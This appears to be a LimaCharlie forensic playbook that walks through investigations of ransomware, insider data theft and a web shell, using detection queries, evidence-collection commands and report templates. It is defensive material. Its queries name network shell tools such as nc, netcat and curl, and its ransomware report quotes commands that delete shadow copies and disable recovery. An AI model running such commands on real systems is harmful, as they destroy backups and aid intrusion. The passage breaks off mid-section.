# Forensic Investigation Examples

Complete investigation scenarios demonstrating forensic methodology using LimaCharlie.

## Table of Contents

1. [Scenario 1: Ransomware Investigation](#scenario-1-ransomware-investigation)
2. [Scenario 2: Insider Threat Investigation](#scenario-2-insider-threat-investigation)
3. [Scenario 3: Web Shell Investigation](#scenario-3-web-shell-investigation)

---

## Scenario 1: Ransomware Investigation

**Objective**: Reconstruct ransomware attack from initial infection through encryption.

### Phase 1: Initial Triage

**Identify Affected Systems**:
```
# Search for encryption-related detections
-24h | plat == windows | * | event/* contains ".encrypted" or event/* contains "ransom" or event/* contains "decrypt" | routing/hostname as host COUNT(event) as events GROUP BY(host)
```

**Collect Volatile Data**:
```bash
# From identified hosts
os_processes
netstat
history_dump
```

---

### Phase 2: Timeline Reconstruction

#### Initial Infection

**Look for suspicious downloads or email attachments**:
```
# Identify entry point
-7d | routing/hostname == "victim-host" | NEW_PROCESS | event/PARENT/FILE_PATH contains "OUTLOOK.EXE" or event/PARENT/FILE_PATH contains "chrome.exe" or event/PARENT/FILE_PATH contains "firefox.exe" | event/FILE_PATH contains "Downloads" or event/FILE_PATH contains "Temp" | event/TIMESTAMP as time event/FILE_PATH as process event/COMMAND_LINE as cmdline
```

**Web-based exploitation**:
```
-7d | plat == windows | NEW_PROCESS | event/PARENT/FILE_PATH contains "iexplore.exe" or event/PARENT/FILE_PATH contains "chrome.exe" or event/PARENT/FILE_PATH contains "firefox.exe" | event/FILE_PATH ends with ".exe" and event/FILE_PATH contains "\\Temp\\" | event/TIMESTAMP as time event/FILE_PATH as process routing/hostname as host
```

#### Execution Chain

**Process execution timeline**:
```
-7d | routing/hostname == "victim-host" | NEW_PROCESS | event/TIMESTAMP as time event/FILE_PATH as process event/PARENT/FILE_PATH as parent event/COMMAND_LINE as cmdline
```

**Script execution**:
```
-7d | plat == windows | NEW_PROCESS | event/FILE_PATH contains "powershell" or event/FILE_PATH contains "wscript" or event/FILE_PATH contains "cscript" | event/TIMESTAMP as time event/COMMAND_LINE as cmdline routing/hostname as host
```

#### Ransomware Execution

**Shadow copy deletion (common ransomware behavior)**:
```
-7d | routing/hostname == "victim-host" | NEW_PROCESS | event/COMMAND_LINE contains "vssadmin" and event/COMMAND_LINE contains "delete" and event/COMMAND_LINE contains "shadows" | event/TIMESTAMP as time event/COMMAND_LINE as cmd
```

**Volume Shadow Service manipulation**:
```
-7d | routing/hostname == "victim-host" | NEW_PROCESS | event/COMMAND_LINE contains "vssadmin delete shadows" or event/COMMAND_LINE contains "wmic shadowcopy delete" or event/COMMAND_LINE contains "bcdedit" and event/COMMAND_LINE contains "recoveryenabled No" | event/TIMESTAMP as time event/COMMAND_LINE as cmd
```

#### File Encryption Timeline

**Mass file modifications**:
```
-24h | routing/hostname == "victim-host" | NEW_DOCUMENT FILE_MODIFIED | event/FILE_PATH contains ".encrypted" or event/FILE_PATH contains ".locked" or event/FILE_PATH contains ".crypt" | event/TIMESTAMP as time event/FILE_PATH as file
```

**All file operations during encryption window**:
```
-24h | routing/hostname == "victim-host" | FILE_MODIFIED NEW_DOCUMENT | event/TIMESTAMP as time event/FILE_PATH as file routing/event_type as activity
```

---

### Phase 3: Artifact Collection

#### Collect Malware

**Hash and collect initial dropper**:
```bash
# Get file info
file_info C:\Users\victim\Downloads\invoice.exe
file_hash C:\Users\victim\Downloads\invoice.exe

# Collect as evidence
artifact_get C:\Users\victim\Downloads\invoice.exe --investigation ransomware-2024-001
```

**Collect ransomware executable**:
```bash
# Identify location from process timeline
file_hash C:\ProgramData\system32.exe
artifact_get C:\ProgramData\system32.exe --investigation ransomware-2024-001
```

#### Collect Ransom Note

```bash
# Find ransom notes
dir_list C:\Users\victim\Desktop
artifact_get C:\Users\victim\Desktop\HOW_TO_DECRYPT.txt --investigation ransomware-2024-001
artifact_get C:\Users\victim\Desktop\README.txt --investigation ransomware-2024-001
```

#### Collect Event Logs

```bash
# Windows Event Logs
log_get Security
log_get System
artifact_get C:\Windows\System32\winevt\Logs\Security.evtx --investigation ransomware-2024-001
artifact_get C:\Windows\System32\winevt\Logs\System.evtx --investigation ransomware-2024-001
```

#### Collect Prefetch and Registry

```bash
# Prefetch files (execution artifacts)
artifact_get C:\Windows\Prefetch\INVOICE.EXE-*.pf --investigation ransomware-2024-001
artifact_get C:\Windows\Prefetch\SYSTEM32.EXE-*.pf --investigation ransomware-2024-001

# Registry hives
artifact_get C:\Windows\System32\config\SYSTEM --investigation ransomware-2024-001
artifact_get C:\Windows\System32\config\SOFTWARE --investigation ransomware-2024-001
```

---

### Phase 4: Memory Analysis

#### Memory Dump for Decryption Keys

**Capture memory before shutdown** (encryption keys may be in memory):
```yaml
# Via D&R rule or API
- action: extension request
  extension name: ext-dumper
  extension action: request_dump
  extension request:
    target: memory
    sid: <<routing.sid>>
    retention: 90
```

#### Process Memory for Active Ransomware

**Get PID of ransomware**:
```bash
os_processes
```

**Extract strings (may contain encryption key)**:
```bash
mem_strings --pid <ransomware_pid>
# Look for: encryption keys, C2 domains, file paths, configuration data
```

**Memory map**:
```bash
mem_map --pid <ransomware_pid>
# Look for: unusual DLLs, executable memory regions, injected code
```

**Read specific memory regions**:
```bash
# After identifying suspicious regions from mem_map
mem_read --pid <ransomware_pid> --base 0x<address> --size 4096
```

---

### Phase 5: Network Analysis

#### C2 Communications

**Network connections during timeframe**:
```
-24h | routing/hostname == "victim-host" | NETWORK_CONNECTIONS | event/TIMESTAMP as time event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS as dst_ip event/NETWORK_ACTIVITY/DESTINATION/PORT as port event/FILE_PATH as process
```

**Filter to non-standard ports and external IPs**:
```
-24h | routing/hostname == "victim-host" | NETWORK_CONNECTIONS | event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS is public and event/NETWORK_ACTIVITY/DESTINATION/PORT not in (80, 443, 53) | event/TIMESTAMP as time event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS as dst_ip event/NETWORK_ACTIVITY/DESTINATION/PORT as port event/FILE_PATH as process
```

#### DNS Queries

**Ransomware C2 domains**:
```
-24h | routing/hostname == "victim-host" | DNS_REQUEST | event/TIMESTAMP as time event/DOMAIN_NAME as domain event/PROCESS_ID as pid
```

**Low prevalence domains (potential C2)**:
```
-24h | plat == windows | DNS_REQUEST | event/DOMAIN_NAME as domain COUNT_UNIQUE(routing/sid) as sensor_count GROUP BY(domain) | sensor_count <= 2
```

---

### Phase 6: Persistence Analysis

#### Check Autoruns

```bash
os_autoruns
```

#### Registry Persistence

**Monitor registry changes during incident window**:
```
-7d | routing/hostname == "victim-host" | REGISTRY_WRITE | event/REGISTRY_KEY contains "\\Run" or event/REGISTRY_KEY contains "\\Services" or event/REGISTRY_KEY contains "\\Winlogon" | event/TIMESTAMP as time event/REGISTRY_KEY as key event/REGISTRY_VALUE as value
```

#### Scheduled Tasks

**Via Windows Event Logs**:
```
-7d | routing/hostname == "victim-host" | WEL | event/EVENT/System/EventID == "4698" | event/TIMESTAMP as time event/EVENT/EventData/TaskName as task event/EVENT/EventData/TaskContent as content
```

---

### Phase 7: Impact Assessment

#### Count Encrypted Files

```
-24h | routing/hostname == "victim-host" | FILE_MODIFIED NEW_DOCUMENT | event/FILE_PATH contains ".encrypted" or event/FILE_PATH contains ".locked" | COUNT(event) as encrypted_files
```

#### File Deletion Timeline

**Deleted shadow copies**:
```
-24h | routing/hostname == "victim-host" | FILE_DELETE | event/TIMESTAMP as time event/FILE_PATH as file
```

#### Affected File Types

```
-24h | routing/hostname == "victim-host" | FILE_MODIFIED | event/FILE_PATH ends with ".docx" or event/FILE_PATH ends with ".xlsx" or event/FILE_PATH ends with ".pdf" or event/FILE_PATH ends with ".jpg" | event/FILE_PATH as file event/TIMESTAMP as time
```

---

### Phase 8: Reporting

**Forensic Report Sections**:

1. **Executive Summary**
   - Ransomware family: [Identified variant]
   - Initial infection: [Date/Time, vector]
   - Systems affected: [Count and hostnames]
   - Files encrypted: [Approximate count]
   - Ransom demanded: [Amount in cryptocurrency]

2. **Timeline of Attack**
   | Time (UTC) | Event | Evidence |
   |------------|-------|----------|
   | 2024-01-10 14:32 | Phishing email opened | Email logs |
   | 2024-01-10 14:33 | Malicious attachment executed | NEW_PROCESS event |
   | 2024-01-10 14:35 | Dropper downloads ransomware payload | NETWORK_CONNECTIONS |
   | 2024-01-10 14:36 | Ransomware executed | NEW_PROCESS, file_hash |
   | 2024-01-10 14:37 | Shadow copies deleted | COMMAND_LINE with vssadmin |
   | 2024-01-10 14:38 | File encryption begins | FILE_MODIFIED events |
   | 2024-01-10 15:15 | Ransom note dropped | NEW_DOCUMENT |

3. **Initial Infection Vector**
   - Phishing email with malicious attachment
   - Attachment: invoice.exe (SHA256: abc123...)
   - Executed from: C:\Users\victim\Downloads\invoice.exe
   - Parent process: OUTLOOK.EXE

4. **Dropper Activity**
   - Downloaded payload from: http://malicious-domain.com/payload.exe
   - Payload saved to: C:\ProgramData\system32.exe
   - Persistence established via: HKLM\Software\Microsoft\Windows\CurrentVersion\Run

5. **Ransomware Execution**
   - Executable: C:\ProgramData\system32.exe (SHA256: def456...)
   - Process ID: 2468
   - Command line: C:\ProgramData\system32.exe -encrypt
   - User context: victim

6. **Defense Evasion**
   - Deleted volume shadow copies: vssadmin delete shadows /all /quiet
   - Disabled system recovery: bcdedit /set {default} recoveryenabled No
   - Terminated security processes: [List if applicable]

7. **Encryption Process**
   - Start time: 2024-01-10 14:38:00 UTC
   - End time: 2024-01-10 15:15:00 UTC
   - Duration: ~37 minutes
   - Files affected: ~15,000 files
   - File types: .docx, .xlsx, .pdf, .jpg, .png, .zip
   - Encrypted extension: .encrypted
   - Encryption algorithm: [If identified via reverse engineering]

8. **C2 Communication**
   - C2 IP addresses: 203.0.113.50, 198.51.100.25
   - C2 domains: evil-ransomware-c2.com
   - Communication protocol: HTTPS (port 443)
   - Data exfiltrated: [If applicable]

9. **Persistence Mechanisms**
   - Registry Run key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate
   - Value: C:\ProgramData\system32.exe
   - Purpose: Ensure encryption continues after reboot if interrupted

10. **IOCs (Indicators of Compromise)**
    - File Hashes:
      - abc123... (invoice.exe - initial dropper)
      - def456... (system32.exe - ransomware payload)
    - Domains:
      - evil-ransomware-c2.com
      - malicious-domain.com
    - IP Addresses:
      - 203.0.113.50
      - 198.51.100.25
    - File Paths:
      - C:\Users\victim\Downloads\invoice.exe
      - C:\ProgramData\system32.exe
    - Registry Keys:
      - HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate

11. **Recovery Recommendations**
    - Isolate affected systems (network disconnection)
    - Do NOT pay ransom (no guarantee of decryption)
    - Check for decryption tools from security vendors
    - Restore from backups (verify backup integrity first)
    - Memory dump analysis for potential decryption keys
    - Rebuild affected systems from known-good images

12. **Prevention Recommendations**
    - Email security: Enhanced filtering, attachment sandboxing
    - User training: Phishing awareness, suspicious attachment identification
    - Endpoint protection: Application whitelisting, behavioral detection
    - Backups: 3-2-1 rule, offline/immutable backups, regular testing
    - Network segmentation: Limit lateral movement
    - Privilege management: Least privilege principle
    - Patch management: Keep systems updated

---

## Scenario 2: Insider Threat Investigation

**Objective**: Investigate suspected data exfiltration by internal user.

### Phase 1: Scope Identification

#### Identify Suspect User Activities

**All activity by specific user**:
```
-30d | plat == windows | NEW_PROCESS | event/USER_NAME == "DOMAIN\\suspect" | event/TIMESTAMP as time event/FILE_PATH as process event/COMMAND_LINE as cmdline routing/hostname as host
```

**Filter to suspicious activities**:
```
-30d | plat == windows | NEW_PROCESS | event/USER_NAME == "DOMAIN\\suspect" and (event/COMMAND_LINE contains "compress" or event/COMMAND_LINE contains "zip" or event/COMMAND_LINE contains "rar" or event/COMMAND_LINE contains "copy" or event/COMMAND_LINE contains "xcopy") | event/TIMESTAMP as time event/COMMAND_LINE as cmdline routing/hostname as host
```

#### Login Timeline

**All logins for suspect user**:
```
-30d | plat == windows | WEL | event/EVENT/System/EventID == "4624" and event/EVENT/EventData/TargetUserName == "suspect" | event/TIMESTAMP as time routing/hostname as host event/EVENT/EventData/LogonType as type event/EVENT/EventData/IpAddress as source
```

**After-hours logins**:
```
-30d | plat == windows | WEL | event/EVENT/System/EventID == "4624" and event/EVENT/EventData/TargetUserName == "suspect" | event/TIMESTAMP as time routing/hostname as host | time < "09:00" or time > "18:00"
```

---

### Phase 2: File Access Analysis

#### Sensitive File Access

**Access to specific file types or locations**:
```
-30d | routing/hostname == "suspect-workstation" | FILE_TYPE_ACCESSED | event/FILE_PATH contains "\\Confidential\\" or event/FILE_PATH contains "\\Finance\\" or event/FILE_PATH contains "\\HR\\" or event/FILE_PATH ends with ".xlsx" or event/FILE_PATH ends with ".docx" | event/TIMESTAMP as time event/FILE_PATH as file
```

**Network share access**:
```
-30d | routing/hostname == "suspect-workstation" | FILE_TYPE_ACCESSED | event/FILE_PATH starts with "\\\\" | event/TIMESTAMP as time event/FILE_PATH as file
```

#### File Copies to External Media

**Files copied to USB or external drives**:
```
-30d | routing/hostname == "suspect-workstation" | NEW_DOCUMENT | event/FILE_PATH starts with "E:\\" or event/FILE_PATH starts with "F:\\" or event/FILE_PATH starts with "G:\\" | event/TIMESTAMP as time event/FILE_PATH as file event/HASH as hash
```

**Large file operations**:
```
-30d | routing/hostname == "suspect-workstation" | NEW_DOCUMENT | event/FILE_SIZE > 10485760 | event/TIMESTAMP as time event/FILE_PATH as file event/FILE_SIZE as size
```

#### Archive Creation

**Creating ZIP/RAR archives (potential staging)**:
```
-30d | routing/hostname == "suspect-workstation" | NEW_PROCESS | event/COMMAND_LINE contains ".zip" or event/COMMAND_LINE contains ".rar" or event/COMMAND_LINE contains ".7z" or event/FILE_PATH contains "7z.exe" or event/FILE_PATH contains "winrar.exe" | event/TIMESTAMP as time event/COMMAND_LINE as cmdline
```

**Created archive files**:
```
-30d | routing/hostname == "suspect-workstation" | NEW_DOCUMENT | event/FILE_PATH ends with ".zip" or event/FILE_PATH ends with ".rar" or event/FILE_PATH ends with ".7z" | event/TIMESTAMP as time event/FILE_PATH as file event/FILE_SIZE as size
```

---

### Phase 3: Network Activity

#### Cloud Storage Uploads

**Connections to cloud storage services**:
```
-30d | routing/hostname == "suspect-workstation" | DNS_REQUEST NETWORK_CONNECTIONS | event/* contains "dropbox" or event/* contains "onedrive" or event/* contains "drive.google" or event/* contains "box.com" or event/* contains "mega.nz" | event/TIMESTAMP as time routing/event_type as activity
```

**DNS queries for cloud storage**:
```
-30d | routing/hostname == "suspect-workstation" | DNS_REQUEST | event/DOMAIN_NAME contains "dropbox" or event/DOMAIN_NAME contains "drive.google" or event/DOMAIN_NAME contains "onedrive" | event/TIMESTAMP as time event/DOMAIN_NAME as domain event/PROCESS_ID as pid
```

#### Large Data Transfers

**High-volume uploads**:
```
-30d | routing/hostname == "suspect-workstation" | NETWORK_CONNECTIONS | event/NETWORK_ACTIVITY/BYTES_SENT > 10485760 | event/TIMESTAMP as time event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS as dst event/NETWORK_ACTIVITY/BYTES_SENT as bytes event/FILE_PATH as process
```

**Aggregate data transfer by destination**:
```
-30d | routing/hostname == "suspect-workstation" | NETWORK_CONNECTIONS | event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS as dst SUM(event/NETWORK_ACTIVITY/BYTES_SENT) as total_bytes GROUP BY(dst) | total_bytes > 104857600
```

#### Email with Attachments

**SMTP connections (potential email exfiltration)**:
```
-30d | routing/hostname == "suspect-workstation" | NETWORK_CONNECTIONS | event/NETWORK_ACTIVITY/DESTINATION/PORT == 25 or event/NETWORK_ACTIVITY/DESTINATION/PORT == 587 or event/NETWORK_ACTIVITY/DESTINATION/PORT == 465 | event/TIMESTAMP as time event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS as smtp_server event/FILE_PATH as process
```

---

### Phase 4: Removable Media

#### USB Device Usage

**Volume mount events**:
```
-30d | routing/hostname == "suspect-workstation" | VOLUME_MOUNT VOLUME_UNMOUNT | event/TIMESTAMP as time routing/event_type as activity event/VOLUME_NAME as device
```

**Correlation with file copies**:
```
# First, identify mount times
-30d | routing/hostname == "suspect-workstation" | VOLUME_MOUNT | event/TIMESTAMP as mount_time event/VOLUME_NAME as device

# Then look for file copies shortly after
-30d | routing/hostname == "suspect-workstation" | NEW_DOCUMENT | event/FILE_PATH starts with "E:\\" or event/FILE_PATH starts with "F:\\" | event/TIMESTAMP as time event/FILE_PATH as file event/HASH as hash
```

#### Files Copied to USB

**Assuming USB mounted as E: or F:**:
```
-30d | routing/hostname == "suspect-workstation" | NEW_DOCUMENT | event/FILE_PATH starts with "E:\\" or event/FILE_PATH starts with "F:\\" | event/TIMESTAMP as time event/FILE_PATH as file event/HASH as hash event/FILE_SIZE as size
```

---

### Phase 5: Evidence Collection

#### Collect Browser History

```bash
# Chrome
artifact_get "C:\Users\suspect\AppData\Local\Google\Chrome\User Data\Default\History" --investigation insider-threat-2024-001

# Edge
artifact_get "C:\Users\suspect\AppData\Local\Microsoft\Edge\User Data\Default\History" --investigation insider-threat-2024-001

# Firefox
artifact_get "C:\Users\suspect\AppData\Roaming\Mozilla\Firefox\Profiles\*\places.sqlite" --investigation insider-threat-2024-001
```

#### Collect Email Evidence

```bash
# Outlook PST files
dir_list "C:\Users\suspect\AppData\Local\Microsoft\Outlook"
artifact_get "C:\Users\suspect\AppData\Local\Microsoft\Outlook\*.pst" --investigation insider-threat-2024-001

# OST files (cached Exchange data)
artifact_get "C:\Users\suspect\AppData\Local\Microsoft\Outlook\*.ost" --investigation insider-threat-2024-001
```

#### Collect Cloud Storage Sync Logs

```bash
# Dropbox
artifact_get "C:\Users\suspect\AppData\Local\Dropbox\*\*.dbx" --investigation insider-threat-2024-001

# OneDrive
artifact_get "C:\Users\suspect\AppData\Local\Microsoft\OneDrive\logs\*" --investigation insider-threat-2024-001
```

#### Collect Recent Files and Jump Lists

```bash
# Recent files
artifact_get "C:\Users\suspect\AppData\Roaming\Microsoft\Windows\Recent\*" --investigation insider-threat-2024-001

# Jump lists
artifact_get "C:\Users\suspect\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\*" --investigation insider-threat-2024-001
artifact_get "C:\Users\suspect\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\*" --investigation insider-threat-2024-001
```

#### Collect Registry Hives

```bash
# User registry
artifact_get "C:\Users\suspect\NTUSER.DAT" --investigation insider-threat-2024-001
artifact_get "C:\Users\suspect\AppData\Local\Microsoft\Windows\UsrClass.dat" --investigation insider-threat-2024-001
```

---

### Phase 6: Timeline Creation

#### Comprehensive User Activity Timeline

```
-30d | routing/hostname == "suspect-workstation" | NEW_PROCESS FILE_TYPE_ACCESSED NEW_DOCUMENT NETWORK_CONNECTIONS VOLUME_MOUNT | event/TIMESTAMP as time routing/event_type as activity event/FILE_PATH as detail
```

#### Focus on Key Timeframes

**Around resignation announcement**:
```
2024-01-15T00:00:00Z to 2024-01-20T23:59:59Z | routing/hostname == "suspect-workstation" | NEW_PROCESS FILE_TYPE_ACCESSED NEW_DOCUMENT NETWORK_CONNECTIONS | event/TIMESTAMP as time routing/event_type as activity
```

---

### Phase 7: Analysis and Correlation

#### Build Evidence Map

**Timeline Correlation**:
1. Employee announces resignation: 2024-01-15
2. After-hours logins increase: 2024-01-16 to 2024-01-20
3. Access to confidential files: 2024-01-17 (multiple occurrences)
4. Archive creation: 2024-01-18 (data.zip, 500MB)
5. USB device insertion: 2024-01-18 21:30
6. Files copied to USB: 2024-01-18 21:32
7. Cloud storage uploads: 2024-01-19 (large transfers to personal Dropbox)
8. Final login: 2024-01-20 (last day of employment)

#### Key Evidence Points

1. **Access to Sensitive Files**:
   - Finance folder: 157 files accessed
   - HR folder: 43 files accessed
   - Confidential folder: 89 files accessed
   - Total: 289 sensitive files

2. **File Staging**:
   - Created: C:\Users\suspect\Documents\data.zip (500MB)
   - Contains: Compressed confidential documents
   - Timestamp: 2024-01-18 21:25 UTC

3. **Exfiltration Methods**:
   - USB Device: 500MB copied to removable drive
   - Cloud Storage: 450MB uploaded to personal Dropbox account
   - Email: 15 emails with attachments sent to personal email

4. **Network Transfer Volumes**:
   - Total uploaded to Dropbox: 450MB
   - Total uploaded via SMTP: 25MB
   - Total copied to USB: 500MB
   - **Total exfiltrated: ~975MB**

---

### Phase 8: Reporting

**Key Report Sections**:

1. **Executive Summary**
   - Employee: [Name], [Position]
   - Investigation period: 30 days prior to departure
   - Finding: Substantial evidence of data exfiltration
   - Volume: ~975MB of confidential data
   - Methods: USB, cloud storage, personal email

2. **Evidence Timeline**
   [Detailed chronological timeline with evidence references]

3. **Accessed Files**
   - List of confidential files accessed
   - Business impact assessment
   - Classification levels

4. **Exfiltration Vectors**
   - USB devices (specific volumes, times)
   - Cloud storage accounts (Dropbox account details)
   - Email accounts (personal email address)

5. **Technical Evidence**
   - File hashes of exfiltrated data
   - Network connection logs
   - USB device serial numbers
   - Cloud storage sync logs

6. **Legal Considerations**
   - Chain of custody documentation
   - Evidence preservation
   - Attorney-client privilege considerations

7. **Recommendations**
   - Legal action evaluation
   - Customer notification (if applicable)
   - Enhanced DLP policies
   - User departure procedures
   - Privilege revocation timing

---

## Scenario 3: Web Shell Investigation

**Objective**: Investigate web server compromise via web shell.

### Phase 1: Detection and Triage

#### Identify Web Shell Execution

**Linux: Web server spawning shells**:
```
-24h | plat == linux | NEW_PROCESS | event/PARENT/FILE_PATH contains "apache" or event/PARENT/FILE_PATH contains "nginx" or event/PARENT/FILE_PATH contains "httpd" | event/FILE_PATH ends with "sh" or event/FILE_PATH ends with "bash" or event/FILE_PATH ends with "dash" | event/TIMESTAMP as time event/FILE_PATH as shell event/COMMAND_LINE as cmd routing/hostname as host
```

**Windows: IIS web server spawning shells**:
```
-24h | plat == windows | NEW_PROCESS | event/PARENT/FILE_PATH contains "w3wp.exe" | event/FILE_PATH ends with "cmd.exe" or event/FILE_PATH ends with "powershell.exe" | event/TIMESTAMP as time event/COMMAND_LINE as cmd routing/hostname as host
```

**Suspicious parent-child relationships**:
```
-24h | plat == linux | NEW_PROCESS | event/PARENT/FILE_PATH contains "httpd" or event/PARENT/FILE_PATH contains "nginx" or event/PARENT/FILE_PATH contains "apache" | event/TIMESTAMP as time event/PARENT/FILE_PATH as parent event/FILE_PATH as child event/COMMAND_LINE as cmdline routing/hostname as host
```

---

### Phase 2: Web Shell Location

#### Find Suspicious Web Files

**List web root and look for recently modified files**:
```bash
# Linux - Apache/Nginx
dir_list /var/www/html --sort-by modified
dir_list /usr/share/nginx/html --sort-by modified

# Windows - IIS
dir_list C:\inetpub\wwwroot --sort-by modified
```

**Common upload directories**:
```bash
# Linux
dir_list /var/www/html/uploads
dir_list /var/www/html/wp-content/uploads  # WordPress
dir_list /var/www/html/images

# Windows
dir_list C:\inetpub\wwwroot\uploads
dir_list C:\inetpub\wwwroot\images
```

#### Identify Web Shell Files

**Common web shell names and patterns**:
- shell.php, cmd.php, backdoor.php
- c99.php, r57.php, b374k.php
- .php files with suspicious names in upload directories
- Files with recent modification times

**Get file information**:
```bash
file_info /var/www/html/uploads/shell.php
file_hash /var/www/html/uploads/shell.php
```

**Look for PHP files in unusual locations**:
```bash
# Files modified in last 7 days
dir_list /var/www/html --sort-by modified
```

---

### Phase 3: Web Shell Analysis

#### Collect Web Shell

```bash
# Hash first for verification
file_hash /var/www/html/uploads/shell.php

# Collect as evidence
artifact_get /var/www/html/uploads/shell.php --investigation webshell-2024-001
```

#### Process Timeline from Web Shell

**All processes spawned by web server**:
```
-7d | routing/hostname == "web-server" | NEW_PROCESS | event/PARENT/FILE_PATH contains "httpd" or event/PARENT/FILE_PATH contains "nginx" or event/PARENT/FILE_PATH contains "apache" or event/PARENT/FILE_PATH contains "w3wp" | event/TIMESTAMP as time event/FILE_PATH as process event/COMMAND_LINE as cmdline event/USER_NAME as user
```

**Filter to suspicious commands**:
```
-7d | routing/hostname == "web-server" | NEW_PROCESS | event/PARENT/FILE_PATH contains "httpd" or event/PARENT/FILE_PATH contains "nginx" | event/COMMAND_LINE contains "wget" or event/COMMAND_LINE contains "curl" or event/COMMAND_LINE contains "nc" or event/COMMAND_LINE contains "bash" or event/COMMAND_LINE contains "python" | event/TIMESTAMP as time event/COMMAND_LINE as cmd
```

---

### Phase 4: Web Server Log Analysis

#### Collect Access Logs

```bash
# Apache
artifact_get /var/log/apache2/access.log --investigation webshell-2024-001
artifact_get /var/log/httpd/access_log --investigation webshell-2024-001

# Nginx
artifact_get /var/log/nginx/access.log --investigation webshell-2024-001

# IIS
artifact_get "C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log" --investigation webshell-2024-001
```

#### Collect Error Logs

```bash
# Apache
artifact_get /var/log/apache2/error.log --investigation webshell-2024-001

# Nginx
artifact_get /var/log/nginx/error.log --investigation webshell-2024-001
```

#### Log Analysis Focus

**Look for in collected logs**:
- First access to web shell file (initial compromise)
- Source IP addresses accessing web shell
- POST requests to web shell (command execution)
- Unusual user agents
- High request volume to specific file
- Upload requests preceding web shell creation

---

### Phase 5: Commands Executed via Web Shell

#### Command Execution Timeline

**Commands run by web server user**:
```
-7d | routing/hostname == "web-server" | NEW_PROCESS | event/USER_NAME == "www-data" or event/USER_NAME == "apache" or event/USER_NAME == "nginx" or event/USER_NAME contains "IIS APPPOOL" | event/TIMESTAMP as time event/FILE_PATH as process event/COMMAND_LINE as cmd
```

#### Common Post-Exploitation Commands

**Reconnaissance**:
```
-7d | routing/hostname == "web-server" | NEW_PROCESS | event/COMMAND_LINE contains "id" or event/COMMAND_LINE contains "whoami" or event/COMMAND_LINE contains "uname" or event/COMMAND_LINE contains "hostname" or event/COMMAND_LINE contains "ifconfig" or event/COMMAND_LINE contains "ip addr" | event/TIMESTAMP as time event/COMMAND_LINE as cmd
```

**File operations**:
```
-7d | routing/hostname == "web-server" | NEW_PROCESS | event/COMMAND_LINE contains "ls" or event/COMMAND_LINE contains "cat" or event/COMMAND_LINE contains "find" or event/COMMAND_LINE contains "grep" | event/TIMESTAMP as time event/COMMAND_LINE as cmd
```

**Download/Upload**:
```
-7d | routing/hostname == "web-server" | NEW_PROCESS | event/COMMAND_LINE contains "wget" or event/COMMAND_LINE contains "curl" or event/COMMAND_LINE contains "scp" or event/COMMAND_LINE contains "nc" | event/TIMESTAMP as time event/COMMAND_LINE as cmd
```

---

### Phase 6: Network Activity from Web Shell

#### Outbound Connections from Web Server

**All connections from web server process**:
```
-7d | routing/hostname == "web-server" | NETWORK_CONNECTIONS | event/FILE_PATH contains "httpd" or event/FILE_PATH contains "nginx" or event/FILE_PATH contains "apache" or event/FILE_PATH contains "w3wp" | event/TIMESTAMP as time event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS as dst event/NETWORK_ACTIVITY/DESTINATION/PORT as port
```

**Filter to unusual destinations**:
```
-7d | routing/hostname == "web-server" | NETWORK_CONNECTIONS | event/FILE_PATH contains "httpd" or event/FILE_PATH contains "nginx" | event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS is public and event/NETWORK_ACTIVITY/DESTINATION/PORT not in (80, 443, 53) | event/TIMESTAMP as time event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS as dst event/NETWORK_ACTIVITY/DESTINATION/PORT as port
```

#### Reverse Shell Connections

**Shell processes making network connections**:
```
-7d | routing/hostname == "web-server" | NEW_TCP4_CONNECTION NETWORK_CONNECTIONS | event/FILE_PATH ends with "sh" or event/FILE_PATH contains "nc" or event/FILE_PATH contains "netcat" or event/FILE_PATH contains "bash" | event/TIMESTAMP as time event/NETWORK_ACTIVITY/DESTINATION/IP_ADDRESS as c2_ip event/NETWORK_ACTIVITY/DESTINATION/PORT as port event/COMMAND_LINE as cmd
```

---

### Phase 7: Persistence and Privilege Escalation

#### Check for Cron Jobs

```bash
# System cron
artifact_get /etc/crontab --investigation webshell-2024-001
artifact_get /etc/cron.d/* --investigation webshell-2024-001

# User cron
artifact_get /var/spool/cron/crontabs/* --investigation webshell-2024-001
```

**Search for malicious cron entries**:
```bash
# Look for cron files modified recently
dir_list /etc/cron.d --sort-by modified
```

#### Check for SSH Keys

```bash
# Root SSH keys
artifact_get /root/.ssh/authorized_keys --investigation webshell-2024-001

# Web server user SSH keys
artifact_get /home/www-data/.ssh/authorized_keys --investigation webshell-2024-001
artifact_get /home/apache/.ssh/authorized_keys --investigation webshell-2024-001
```

#### Sudo Usage

**Collect authentication logs**:
```bash
# Debian/Ubuntu
artifact_get /var/log/auth.log --investigation webshell-2024-001

# RHEL/CentOS
artifact_get /var/log/secure --investigation webshell-2024-001
```

**Look for sudo usage**:
```
-7d | routing/hostname == "web-server" | SSH_LOGIN | event/TIMESTAMP as time event/USER_NAME as user
```

#### Check for New Users

```bash
# User accounts
artifact_get /etc/passwd --investigation webshell-2024-001
artifact_get /etc/shadow --investigation webshell-2024-001
artifact_get /etc/group --investigation webshell-2024-001
```

---

### Phase 8: Initial Access Vector

#### Web Application Vulnerability

**Analyze web logs for exploit attempts around web shell upload time**:

**Common Indicators**:
- File upload functionality abuse
- SQL injection leading to file write
- Insecure deserialization
- Path traversal attempts
- Remote File Inclusion (RFI)
- Local File Inclusion (LFI)

**Look for in web logs**:
```
# File upload requests before web shell creation
# Look for POST requests to upload.php, etc.

# Path traversal attempts
# Look for ../ in URLs

# SQL injection attempts
# Look for ' or 1=1, UNION SELECT, etc.
```

#### Timeline Correlation

**Build attack timeline**:
1. Initial vulnerability exploitation
2. Web shell upload
3. First access to web shell
4. Reconnaissance commands
5. Privilege escalation attempts
6. Persistence establishment
7. Data access or exfiltration
8. Lateral movement (if applicable)

---

### Phase 9: Scope and Impact

#### Determine Compromise Scope

**What data was accessed**:
